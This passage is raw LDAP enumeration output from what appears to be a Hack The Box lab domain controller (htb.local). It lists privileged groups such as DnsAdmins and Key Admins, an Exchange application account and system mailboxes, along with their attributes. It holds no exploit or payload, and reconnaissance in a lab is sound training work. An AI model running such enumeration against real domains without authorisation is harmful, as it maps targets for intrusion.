|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: Denied RODC Password Replication Group
|         description: Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
|         member: CN=Read-only Domain Controllers,CN=Users,DC=htb,DC=local
|         member: CN=Group Policy Creator Owners,CN=Users,DC=htb,DC=local
|         member: CN=Domain Admins,CN=Users,DC=htb,DC=local
|         member: CN=Cert Publishers,CN=Users,DC=htb,DC=local
|         member: CN=Enterprise Admins,CN=Users,DC=htb,DC=local
|         member: CN=Schema Admins,CN=Users,DC=htb,DC=local
|         member: CN=Domain Controllers,CN=Users,DC=htb,DC=local
|         member: CN=krbtgt,CN=Users,DC=htb,DC=local
|         distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:53:23 UTC
|         whenChanged: 2019/09/18 10:53:23 UTC
|         uSNCreated: 12405
|         uSNChanged: 12433
|         name: Denied RODC Password Replication Group
|         objectGUID: 85841ef1-9221-204d-889c-673355fe244f
|         objectSid: 1-5-21-3072663084-364016917-1341370565-572
|         sAMAccountName: Denied RODC Password Replication Group
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Read-only Domain Controllers,CN=Users,DC=htb,DC=local
|     dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: Enterprise Read-only Domain Controllers
|         description: Members of this group are Read-Only Domain Controllers in the enterprise
|         distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:53:23 UTC
|         whenChanged: 2019/09/18 10:53:23 UTC
|         uSNCreated: 12429
|         uSNChanged: 12431
|         name: Enterprise Read-only Domain Controllers
|         objectGUID: f9d71231-d92-740-b238-8480a1a03d3
|         objectSid: 1-5-21-3072663084-364016917-1341370565-498
|         sAMAccountName: Enterprise Read-only Domain Controllers
|         sAMAccountType: 268435456
|         groupType: -2147483640
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Cloneable Domain Controllers,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: Cloneable Domain Controllers
|         description: Members of this group that are domain controllers may be cloned.
|         distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:53:23 UTC
|         whenChanged: 2019/09/18 10:53:23 UTC
|         uSNCreated: 12440
|         uSNChanged: 12442
|         name: Cloneable Domain Controllers
|         objectGUID: d8693b95-c468-ea44-8748-dc45c26dd433
|         objectSid: 1-5-21-3072663084-364016917-1341370565-522
|         sAMAccountName: Cloneable Domain Controllers
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Protected Users,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: Protected Users
|         description: Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
|         distinguishedName: CN=Protected Users,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:53:23 UTC
|         whenChanged: 2019/09/18 10:53:23 UTC
|         uSNCreated: 12445
|         uSNChanged: 12447
|         name: Protected Users
|         objectGUID: f49ff1f0-ac6e-b445-8b0-4557dad337dc
|         objectSid: 1-5-21-3072663084-364016917-1341370565-525
|         sAMAccountName: Protected Users
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Key Admins,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: Key Admins
|         description: Members of this group can perform administrative actions on key objects within the domain.
|         distinguishedName: CN=Key Admins,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:53:23 UTC
|         whenChanged: 2019/09/18 10:53:23 UTC
|         uSNCreated: 12450
|         uSNChanged: 12452
|         name: Key Admins
|         objectGUID: d96a5abb-188-3a4f-9094-6c69574d82ad
|         objectSid: 1-5-21-3072663084-364016917-1341370565-526
|         sAMAccountName: Key Admins
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Enterprise Key Admins,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: Enterprise Key Admins
|         description: Members of this group can perform administrative actions on key objects within the forest.
|         distinguishedName: CN=Enterprise Key Admins,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:53:23 UTC
|         whenChanged: 2019/09/18 10:53:23 UTC
|         uSNCreated: 12453
|         uSNChanged: 12455
|         name: Enterprise Key Admins
|         objectGUID: 8ca3f11-ac78-b745-a32f-8cfa23b7f093
|         objectSid: 1-5-21-3072663084-364016917-1341370565-527
|         sAMAccountName: Enterprise Key Admins
|         sAMAccountType: 268435456
|         groupType: -2147483640
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         isCriticalSystemObject: TRUE
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=DnsAdmins,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: DnsAdmins
|         description: DNS Administrators Group
|         distinguishedName: CN=DnsAdmins,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:54:03 UTC
|         whenChanged: 2019/09/18 10:54:03 UTC
|         uSNCreated: 12483
|         uSNChanged: 12485
|         name: DnsAdmins
|         objectGUID: 64d78f1a-39a7-fe4f-ba23-eae7f846b8b
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1101
|         sAMAccountName: DnsAdmins
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=DnsUpdateProxy,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: DnsUpdateProxy
|         description: DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
|         distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:54:03 UTC
|         whenChanged: 2019/09/18 10:54:03 UTC
|         uSNCreated: 12488
|         uSNChanged: 12488
|         name: DnsUpdateProxy
|         objectGUID: c2c7c95-4bea-8a45-a494-93df6f83979a
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1102
|         sAMAccountName: DnsUpdateProxy
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Exchange Online-ApplicationAccount,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: Exchange Online-ApplicationAccount
|         distinguishedName: CN=Exchange Online-ApplicationAccount,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:26 UTC
|         whenChanged: 2019/09/19 11:11:26 UTC
|         uSNCreated: 23683
|         uSNChanged: 23684
|         garbageCollPeriod: 1209600
|         name: Exchange Online-ApplicationAccount
|         objectGUID: 2f9f1f5c-ec7d-214c-8ffa-4dc777e76c4a
|         userAccountControl: 546
|         badPwdCount: 0
|         codePage: 0
|         countryCode: 0
|         badPasswordTime: Never
|         lastLogoff: 0
|         lastLogon: Never
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1123
|         accountExpires: 30828-09-14T09:57:29+00:00
|         logonCount: 0
|         sAMAccountName: $331000-VK4ADACQNUCA
|         sAMAccountType: 805306368
|         userPrincipalName: Exchange_Online-ApplicationAccount@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         msExchVersion: 1130555651391488
|         msExchProvisioningFlags: 0
|         msExchMailboxAuditEnable: FALSE
|         msExchUserBL: CN=MeetingGraphApplication-Exchange Online-ApplicationAccount,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchUserBL: CN=MailboxSearchApplication-Exchange Online-ApplicationAccount,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchUserBL: CN=TeamMailboxLifecycleApplication-Exchange Online-ApplicationAccou,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchUserBL: CN=Mailbox Search-Exchange Online-ApplicationAccount,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchUserBL: CN=LegalHoldApplication-Exchange Online-ApplicationAccount,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchUserBL: CN=ArchiveApplication-Exchange Online-ApplicationAccount,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchUserBL: CN=UserApplication-Exchange Online-ApplicationAccount,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchTransportRecipientSettingsFlags: 0
|         internetEncoding: 0
|         msExchModerationFlags: 6
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 0
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         msExchRecipientDisplayType: 12
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchMDBRulesQuota: 256
|         msExchRecipientTypeDetails: 33554432
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
|     dn: CN=SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1},CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
|         sn: MSExchApproval 1f05a927-3be2-4fb9-aa03-b59fe3b56f4c
|         distinguishedName: CN=SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1},CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:27 UTC
|         whenChanged: 2019/09/19 11:47:15 UTC
|         displayName: Microsoft Exchange Approval Assistant
|         uSNCreated: 23777
|         uSNChanged: 24819
|         proxyAddresses: SMTP:SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local
|         name: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
|         objectGUID: 7a1aa2b-484c-474a-b291-2026675efed
|         userAccountControl: 514
|         badPwdCount: 0
|         codePage: 0
|         countryCode: 0
|         badPasswordTime: Never
|         lastLogoff: 0
|         lastLogon: Never
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1124
|         accountExpires: 30828-09-14T09:57:29+00:00
|         logonCount: 0
|         sAMAccountName: SM_2c8eef0a09b545acb
|         sAMAccountType: 805306368
|         legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=4d0d9ee8e5aa4097bfd477c844b94abf-Syste
|         userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         mail: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local
|         msExchVersion: 1126140425011200
|         msExchProvisioningFlags: 0
|         homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchApprovalApplicationLink: CN=ModeratedRecipients,CN=Approval Applications,CN=First
Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchApprovalApplicationLink: CN=AutoGroup,CN=Approval Applications,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchMailboxSecurityDescriptor: \x01\x00\x04\x80\x14\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x04\x00\x1C\x00\x01\x00\x00\x00\x00\x02\x14\x00\x05\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchRequireAuthToSendTo: TRUE
|         msExchArchiveQuota: 104857600
|         msExchMailboxAuditEnable: FALSE
|         msExchTransportRecipientSettingsFlags: 0
|         msExchDumpsterWarningQuota: 20971520
|         msExchELCMailboxFlags: 130
|         msExchMailboxTemplateLink: CN=ArbitrationMailbox,CN=Retention Policies Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchMailboxGuid: \xD8\x14\xC5\x13\xFC\xF4pA\x9C\xA8,\xB1\x03\xB5|\xB4
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:797836624526913052927892047252322452711419621
|         msExchUMDtmfMap: lastNameFirstName:6739242777682513052927323243292203259333256342
|         msExchUMDtmfMap: firstNameLastName:6739242777682513052927323243292203259333256342
|         msExchArchiveWarnQuota: 94371840
|         msExchModerationFlags: 6
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         msExchRecipientDisplayType: 10
|         mDBUseDefaults: FALSE
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
|         msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
|         msExchRecipientTypeDetails: 8388608
|         mailNickname: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
|         msExchWhenMailboxCreated: 20190919114715.0Z
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
|     dn: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
|         sn: SystemMailbox bb558c35-97f1-4cb9-8ff7-d53741dc928c
|         distinguishedName: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:27 UTC
|         whenChanged: 2019/09/19 11:49:31 UTC
|         displayName: Microsoft Exchange
|         uSNCreated: 23782
|         uSNChanged: 24888
|         proxyAddresses: SMTP:SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local
|         name: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
|         objectGUID: c271a7f4-030-f543-a3a4-741abcd8bec3
|         userAccountControl: 514
|         badPwdCount: 0
|         codePage: 0
|         countryCode: 0
|         badPasswordTime: Never
|         lastLogoff: 0
|         lastLogon: Never
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1125
|         accountExpires: 30828-09-14T09:57:29+00:00
|         logonCount: 0
|         sAMAccountName: SM_ca8c2ed5bdab4dc9b
|         sAMAccountType: 805306368
|         legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=5f90cd7455db492fb2b3b90df3946396-Syste
|         userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         mail: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local
|         msExchVersion: 1126140425011200
|         msExchProvisioningFlags: 0
|         homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchApprovalApplicationLink: CN=ModeratedRecipients,CN=Approval Applications,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchApprovalApplicationLink: CN=AutoGroup,CN=Approval Applications,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchMailboxSecurityDescriptor: \x01\x00\x04\x80\x14\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x04\x00\x1C\x00\x01\x00\x00\x00\x00\x02\x14\x00\x05\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchRequireAuthToSendTo: TRUE
|         msExchArchiveQuota: 104857600
|         msExchMailboxAuditEnable: FALSE
|         msExchTransportRecipientSettingsFlags: 0
|         msExchDumpsterWarningQuota: 20971520
|         msExchELCMailboxFlags: 130
|         msExchMailboxTemplateLink: CN=ArbitrationMailbox,CN=Retention Policies Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchMailboxGuid: N\xD2\x15\xDBz\xFD\xE9M\xB5K8b\x1B\xB5	L
|         msExchTextMessagingState: 302120705
|         msExchTextMessagingState: 16842751
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:797836624526922558235973142298337353741329282
|         msExchUMDtmfMap: lastNameFirstName:797836624526922558235973142298337353741329282
|         msExchUMDtmfMap: firstNameLastName:797836624526922558235973142298337353741329282
|         msExchArchiveWarnQuota: 94371840
|         msExchModerationFlags: 6
|         msExchCapabilityIdentifiers: 46
|         msExchCapabilityIdentifiers: 52
|         msExchCapabilityIdentifiers: 51
|         msExchCapabilityIdentifiers: 47
|         msExchCapabilityIdentifiers: 44
|         msExchCapabilityIdentifiers: 43
|         msExchCapabilityIdentifiers: 42
|         msExchCapabilityIdentifiers: 40
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         submissionContLength: 1048576
|         msExchRecipientDisplayType: 10
|         mDBUseDefaults: FALSE
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
|         msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
|         msExchOABGeneratingMailboxBL: CN=Default Offline Address Book,CN=Offline Address Lists,CN=Address Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchRecipientTypeDetails: 8388608
|         mailNickname: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
|         msExchWhenMailboxCreated: 20190919114721.0Z
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
|     dn: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
|         sn: MsExchDiscovery e0dc1c29-89c3-4034-b678-e6c29d823ed9
|         distinguishedName: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:27 UTC
|         whenChanged: 2019/09/19 11:47:29 UTC
|         displayName: Microsoft Exchange
|         uSNCreated: 23787
|         uSNChanged: 24836
|         proxyAddresses: SMTP:SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local
|         name: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
|         objectGUID: 19e3b87e-ca26-1945-b3c-c5583fbd925
|         userAccountControl: 514
|         badPwdCount: 0
|         codePage: 0
|         countryCode: 0
|         badPasswordTime: Never
|         lastLogoff: 0
|         lastLogon: Never
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1126
|         accountExpires: 30828-09-14T09:57:29+00:00
|         logonCount: 0
|         sAMAccountName: SM_75a538d3025e4db9a
|         sAMAccountType: 805306368
|         legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=44aefc0a94d2429fa20e64cf51b1c537-Syste
|         userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         mail: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local
|         msExchVersion: 1126140425011200
|         msExchProvisioningFlags: 0
|         homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchMailboxSecurityDescriptor: \x01\x00\x04\x80\x14\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x04\x00\x1C\x00\x01\x00\x00\x00\x00\x02\x14\x00\x05\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchRequireAuthToSendTo: TRUE
|         msExchArchiveQuota: 104857600
|         msExchMailboxAuditEnable: FALSE
|         msExchTransportRecipientSettingsFlags: 0
|         msExchDumpsterWarningQuota: 20971520
|         msExchELCMailboxFlags: 2
|         msExchMailboxTemplateLink: CN=ArbitrationMailbox,CN=Retention Policies Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchMailboxGuid: \xAA
|         2\x88\xBF\xA3@K\xB4\x96E\x972\xFD"=
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:797836624526930321229892340342678362293823339
|         msExchUMDtmfMap: lastNameFirstName:67392434726837930321229892340342678362293823339
|         msExchUMDtmfMap: firstNameLastName:67392434726837930321229892340342678362293823339
|         msExchArchiveWarnQuota: 94371840
|         msExchModerationFlags: 6
|         msExchCapabilityIdentifiers: 41
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         msExchRecipientDisplayType: 10
|         mDBUseDefaults: FALSE
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
|         msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
|         msExchRecipientTypeDetails: 8388608
|         mailNickname: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
|         msExchWhenMailboxCreated: 20190919114729.0Z
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
|     dn: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}
|         sn: MsExchDiscoveryMailbox D919BA05-46A6-415f-80AD-7E09334BB852
|         distinguishedName: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:27 UTC
|         whenChanged: 2019/09/19 11:48:40 UTC
